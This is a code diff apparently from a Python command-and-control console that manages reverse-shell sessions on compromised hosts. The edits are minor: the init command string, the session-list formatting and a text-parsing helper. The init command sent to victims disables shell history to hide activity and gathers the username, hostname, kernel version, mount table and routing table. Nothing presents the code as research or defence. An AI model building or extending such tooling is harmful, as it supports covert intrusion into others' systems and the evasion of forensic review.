@@ -76,7 +76,7 @@ async def handle_shell_init(reader, writer):
     randomStringHostnameSuffix = randomString()
     randomStringInitEndSuffix = randomString()
     init_command = str()
-    init_command = "export HISTSIZE=0;"
+    init_command += "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
     init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
@@ -194,7 +194,7 @@ async def MasterConsole():
 
         elif console_cmd.split() and console_cmd.split()[0] == "sessions" :
             for session in Puppet_Master.sessions:
-                print(f"\033[1;37m{session['hash']}\033[0m  {session['hostname']} {session['username']}  {session['sockname']} -> {session['peername']}  {session['org']}  {session['inittime']}")
+                print(f"\033[1;37m{session['hash']}\033[0m  {session['hostname'].ljust(16,' ')} {session['username'].ljust(8,' ')}  {session['sockname']} -> {session['peername']}  {session['org']}  {session['inittime']}")
             
         elif console_cmd.split() and console_cmd.split()[0] == "listerner":
             print()
@@ -242,8 +242,8 @@ def randomString():
     return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 16))
 
 def getTextBetweenStrings(text, start_string, end_string):
-    start_index = text.find(start_string) + len(start_string)
-    end_index = text.find(end_string, start_index)
+    start_index = text.rfind(start_string) + len(start_string)
+    end_index = text.rfind(end_string, start_index)
     return text[start_index:end_index]
 
 async def main():
